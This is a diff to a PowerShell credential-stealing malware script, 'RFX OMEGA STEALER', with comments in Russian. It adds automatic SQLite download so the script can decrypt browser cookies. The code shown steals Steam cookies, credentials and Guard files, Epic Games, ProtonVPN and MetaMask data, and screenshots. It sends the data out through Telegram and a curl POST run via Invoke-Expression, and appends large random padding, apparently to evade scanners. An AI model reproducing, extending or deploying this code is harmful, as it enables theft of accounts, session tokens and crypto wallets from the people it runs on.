@@ -1,6 +1,6 @@
 # ============================================================
-#                   RFX OMEGA STEALER v2.0
-#           Расшифровка Steam-токенов + полный сбор
+#                   RFX OMEGA STEALER v2.1
+#           Автоматическая загрузка SQLite + кража Steam
 # ============================================================
 $ErrorActionPreference = 'SilentlyContinue'
 
@@ -121,38 +121,66 @@ function Get-MasterKey {
     $encKeyB64 = $json.os_crypt.encrypted_key
     if (-not $encKeyB64) { return $null }
     $encKey = [System.Convert]::FromBase64String($encKeyB64)
-    $encKey = $encKey[5..($encKey.Length-1)]   # убираем префикс "DPAPI"
+    $encKey = $encKey[5..($encKey.Length-1)]
     Unprotect-DPAPI -cipherText $encKey
 }
 
-# ------------------- ЗАГРУЗКА SQLite (если отсутствует) -------------------
+# ------------------- НОВАЯ УЛУЧШЕННАЯ ЗАГРУЗКА SQLite -------------------
 function Load-SQLite {
-    $tempDir = "$env:TEMP\SQLite_$([System.Guid]::NewGuid())"
-    $null = New-Item -ItemType Directory -Path $tempDir -Force
-    $dllUrl = "https://system.data.sqlite.org/downloads/1.0.118.0/sqlite-netFx46-binary-bundle-Win32-2018-1.0.118.0.zip"
+    # Проверяем, может уже загружена
+    try {
+        [System.Data.SQLite.SQLiteConnection]::new("Data Source=:memory:") | Out-Null
+        return $true
+    } catch {
+        # Не загружена – пробуем найти
+    }
+
+    # 1. Пытаемся найти в системных папках (если уже установлена)
+    $possiblePaths = @(
+        "$env:ProgramFiles\System.Data.SQLite\System.Data.SQLite.dll",
+        "$env:ProgramFiles(x86)\System.Data.SQLite\System.Data.SQLite.dll",
+        "$env:SYSTEMROOT\System32\System.Data.SQLite.dll",
+        [System.IO.Path]::Combine($env:SYSTEMROOT, "Microsoft.NET\assembly\GAC_MSIL\System.Data.SQLite\v4.0_1.0.119.0__db937bc2d44ff139\System.Data.SQLite.dll")
+    )
+    foreach ($path in $possiblePaths) {
+        if (Test-Path $path) {
+            try { Add-Type -Path $path -ErrorAction Stop; return $true } catch {}
+        }
+    }
+
+    # 2. Скачиваем и распаковываем свежую версию в %TEMP%
+    $tempDir = "$env:TEMP\SQLiteLoader_$([System.Guid]::NewGuid())"
+    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+    $zipUrl = "https://system.data.sqlite.org/downloads/1.0.119.0/sqlite-netFx46-binary-bundle-Win32-2018-1.0.119.0.zip"
     $zipPath = "$tempDir\sqlite.zip"
     try {
-        Invoke-WebRequest -Uri $dllUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
+        (New-Object Net.WebClient).DownloadFile($zipUrl, $zipPath)
         Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
-        $dllPath = Get-ChildItem -Path $tempDir -Recurse -Filter "System.Data.SQLite.dll" | Select-Object -First 1 -ExpandProperty FullName
-        if ($dllPath) {
-            Add-Type -Path $dllPath
-            return $true
+        # Ищем нужную DLL – для x64 или x86
+        $arch = if ([System.Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
+        $dllCandidates = @(
+            "$tempDir\bin\$arch\System.Data.SQLite.dll",
+            "$tempDir\System.Data.SQLite.dll"
+        )
+        $found = $false
+        foreach ($dll in $dllCandidates) {
+            if (Test-Path $dll) {
+                Add-Type -Path $dll -ErrorAction Stop
+                $script:SQLitePath = $dll
+                $found = $true
+                break
+            }
         }
-    } catch {}
-    # Если загрузка не удалась, пытаемся найти в системных папках
-    $systemDll = [System.IO.Path]::Combine($env:SYSTEMROOT, "System32", "System.Data.SQLite.dll")
-    if (Test-Path $systemDll) {
-        Add-Type -Path $systemDll
-        return $true
+        if ($found) {
+            return $true
+        } else {
+            throw "Не найдена System.Data.SQLite.dll в распакованном архиве"
+        }
+    } catch {
+        Write-Warning "Не удалось загрузить SQLite: $_"
+        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+        return $false
     }
-    return $false
-}
-
-$sqliteLoaded = Load-SQLite
-if (-not $sqliteLoaded) {
-    # Если SQLite не загружен, используем урезанный метод – копирование файлов без расшифровки
-    Write-Warning "SQLite не загружен, расшифровка кук невозможна, будут скопированы только сырые файлы."
 }
 
 # ------------------- ФУНКЦИИ КРАЖИ -------------------
@@ -297,7 +325,7 @@ function getSteamCookies {
         }
     }
 
-    # ---- Firefox (копируем файлы, т.к. расшифровка сложнее) ----
+    # ---- Firefox (копируем файлы) ----
     $firefoxProfiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
     foreach ($profile in $firefoxProfiles) {
         $cookieDb = Join-Path $profile.FullName "cookies.sqlite"
@@ -306,16 +334,15 @@ function getSteamCookies {
         }
     }
 
-    # ---- Сохраняем расшифрованные куки в файл и отправляем ----
+    # ---- Сохраняем расшифрованные куки ----
     if ($allCookies.Count -gt 0) {
         $cookiesTxt = "$cookieFolder\steam_cookies_plain.txt"
         $allCookies | ForEach-Object { "$($_.Host) | $($_.Name) = $($_.Value)" } | Out-File $cookiesTxt -Encoding utf8
-        # Формируем сообщение
         $msg = "STEAM COOKIES (расшифрованы):`n" + ($allCookies | ForEach-Object { "$($_.Host) : $($_.Name) = $($_.Value)" } -join "`n")
         Send-TelegramMessage -text $msg
     }
 
-    # ---- Копируем сырые файлы кук (на всякий случай) ----
+    # ---- Копируем сырые файлы (запасной вариант) ----
     $cookieFiles = @(
         "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
         "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
@@ -363,7 +390,6 @@ function takeScreenshot {
     } catch { }
 }
 
-# ------------------- ОСТАЛЬНЫЕ ФУНКЦИИ (без изменений) -------------------
 function getepic {
     $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
     if (!(Test-Path $epicgamesfolder)) {return}
@@ -446,7 +472,7 @@ function startvare {
         getsteam
         getSteamGuardFiles
         getSteamCredentials
-        getSteamCookies          # НОВАЯ РАСШИФРОВАННАЯ ВЕРСИЯ
+        getSteamCookies
     }
     if ($epicvr -eq "true") { getepic }
     if ($protonvr -eq "true") { getproton }
@@ -456,6 +482,12 @@ function startvare {
 }
 
 # ------------------- ВЫПОЛНЕНИЕ -------------------
+# Загружаем SQLite перед запуском
+$sqliteLoaded = Load-SQLite
+if (-not $sqliteLoaded) {
+    Write-Warning "SQLite не загружен, расшифровка кук невозможна, будут скопированы только сырые файлы."
+}
+
 startvare
 
 # Сбор статусов
@@ -470,7 +502,6 @@ if (!(Test-Path "$main\screenshot.png")) {} else { $screenshot = "Found" }
 $sessionscontent = "$vare`n========================================================`n`nTelegram  : $telegram`n`nSteam : $steam`n`nMetaMask : $metamask`n`nProtonVPN : $proton`n`nEpic Games : $epicgames`n`nDiscord : $discord`n`nScreenshot : $screenshot`n`n========================================================"
 $sessionscontent > "$main\Sessions.txt"
 
-# Упаковка и отправка
 Compress-Archive -Path $main -DestinationPath "$main.zip" -CompressionLevel Fastest -Force
 Remove-Item $main -Recurse -Force
 
@@ -480,6 +511,5 @@ $crl = "curl.exe -X POST -H ""content-type: multipart/form-data"" -F document=@'
 Invoke-Expression $crl | Out-Null
 Remove-Item "$main.zip" -Force -ErrorAction SilentlyContinue
 
-# Padding (оставлен как было)
 $padding = [byte[]]::new(25 * 1024 * 1024)
 (New-Object Random).NextBytes($padding)
